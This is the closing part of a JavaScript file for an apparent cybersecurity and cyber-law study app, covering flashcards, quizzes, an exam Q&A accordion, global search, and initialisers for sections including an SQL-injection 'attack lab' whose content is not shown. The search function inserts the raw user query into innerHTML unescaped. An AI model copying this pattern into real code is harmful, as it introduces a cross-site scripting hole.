  document.getElementById('fc-status-text').textContent = `Card ${fcIndex + 1} of ${flashcards.length} (${masteredSet.size} Mastered)`;
  const btn = document.getElementById('fc-master-btn');
  btn.textContent = masteredSet.has(fcIndex) ? "★ Mastered" : "✓ Mark Mastered";
}

function flipCurrentCard() {
  document.getElementById('fc-card-inner').classList.toggle('flipped');
}

function nextFlashcard() {
  fcIndex = (fcIndex + 1) % flashcards.length;
  renderFlashcard();
}

function prevFlashcard() {
  fcIndex = (fcIndex - 1 + flashcards.length) % flashcards.length;
  renderFlashcard();
}

function toggleMasterCard() {
  if (masteredSet.has(fcIndex)) masteredSet.delete(fcIndex);
  else masteredSet.add(fcIndex);
  renderFlashcard();
  updateMasteryUI();
}

function shuffleCards() {
  flashcards.sort(() => Math.random() - 0.5);
  fcIndex = 0;
  masteredSet.clear();
  renderFlashcard();
  updateMasteryUI();
}

// Quiz
function renderQuizList() {
  const list = document.getElementById('quiz-list');
  list.innerHTML = quizQuestions.map((q, qIdx) => {
    const chosen = quizAnswers[qIdx];
    const opts = q.options.map((opt, oIdx) => {
      let cls = "quiz-opt-btn";
      if (chosen !== undefined) {
        if (oIdx === q.correct) cls += " correct";
        else if (oIdx === chosen) cls += " wrong";
      }
      return `<button class="${cls}" onclick="pickQuizOption(${qIdx}, ${oIdx})">${opt}</button>`;
    }).join('');
    const exp = chosen !== undefined
      ? `<div class="highlight-panel" style="margin-top:0.5rem;border-color:var(--primary)">
           <strong>${chosen === q.correct ? '✅ Correct!' : '❌ Incorrect.'}</strong> ${q.exp}
         </div>`
      : '';
    return `
      <div class="card">
        <div style="font-weight:700;font-size:0.96rem">${q.q}</div>
        <div class="quiz-options">${opts}</div>
        ${exp}
      </div>
    `;
  }).join('');

  const correctCount = Object.keys(quizAnswers).filter(k => quizAnswers[k] === quizQuestions[k].correct).length;
  document.getElementById('quiz-score-pill').textContent = `Score: ${correctCount} / ${quizQuestions.length}`;
}

function pickQuizOption(qIdx, oIdx) {
  if (quizAnswers[qIdx] !== undefined) return;
  quizAnswers[qIdx] = oIdx;
  renderQuizList();
  updateMasteryUI();
}

function resetQuizAll() {
  quizAnswers = {};
  renderQuizList();
  updateMasteryUI();
}

// Solved Exam Q&A
function initExamQA() {
  document.getElementById('qa-accordion-list').innerHTML = examQA.map((item, idx) => `
    <div class="qa-card">
      <button class="qa-header" onclick="toggleQAItem(${idx})">
        <span>${item.q}</span>
        <span id="qa-sign-${idx}">+</span>
      </button>
      <div class="qa-body hidden" id="qa-content-${idx}">${item.a}</div>
    </div>
  `).join('');
}

function toggleQAItem(idx) {
  const el = document.getElementById('qa-content-' + idx);
  const sign = document.getElementById('qa-sign-' + idx);
  const isHidden = el.classList.contains('hidden');
  el.classList.toggle('hidden', !isHidden);
  sign.textContent = isHidden ? '−' : '+';
}

function expandAllQA(expand) {
  examQA.forEach((_, idx) => {
    document.getElementById('qa-content-' + idx).classList.toggle('hidden', !expand);
    document.getElementById('qa-sign-' + idx).textContent = expand ? '−' : '+';
  });
}

// Global Search
function handleGlobalSearch(query) {
  const box = document.getElementById('search-results-box');
  const q = query.trim().toLowerCase();
  if (!q) {
    box.classList.add('hidden');
    return;
  }
  const matches = [];
  itActSections.forEach(s => {
    if ((s.sec + " " + s.title + " " + s.desc).toLowerCase().includes(q)) {
      matches.push({ title: `${s.sec}: ${s.title}`, sub: s.pen, view: 'itact' });
    }
  });
  examQA.forEach(item => {
    if ((item.q + " " + item.a).toLowerCase().includes(q)) {
      matches.push({ title: item.q, sub: "Solved Exam Question", view: 'examqa' });
    }
  });
  flashcards.forEach(f => {
    if ((f.q + " " + f.a).toLowerCase().includes(q)) {
      matches.push({ title: f.q, sub: f.a, view: 'flashcards' });
    }
  });

  box.classList.remove('hidden');
  if (matches.length === 0) {
    box.innerHTML = `<div class="muted-text">No matches found for "${query}".</div>`;
  } else {
    box.innerHTML = `
      <div style="font-size:0.78rem;font-weight:700;color:var(--primary);margin-bottom:0.5rem">SEARCH RESULTS (${matches.length}) — Click to Jump:</div>
      <div style="display:flex;flex-direction:column;gap:0.4rem">
        ${matches.slice(0, 6).map(m => `
          <div onclick="navigate('${m.view}');document.getElementById('search-results-box').classList.add('hidden');" style="padding:0.5rem 0.75rem;border-radius:8px;background:var(--bg);cursor:pointer;border:1px solid var(--border)">
            <div style="font-weight:700;font-size:0.86rem">${m.title}</div>
            <div class="muted-text" style="font-size:0.78rem">${m.sub}</div>
          </div>
        `).join('')}
      </div>
    `;
  }
}

// Initialize Everything on Load
window.addEventListener('DOMContentLoaded', () => {
  initJurisdictions();
  initITActExplorer();
  updatePKISim();
  initIPRCards();
  switchAttackLab('sqli');
  initCSIRTStepper();
  initGallery();
  renderFlashcard();
  renderQuizList();
  initExamQA();
  updateMasteryUI();
});
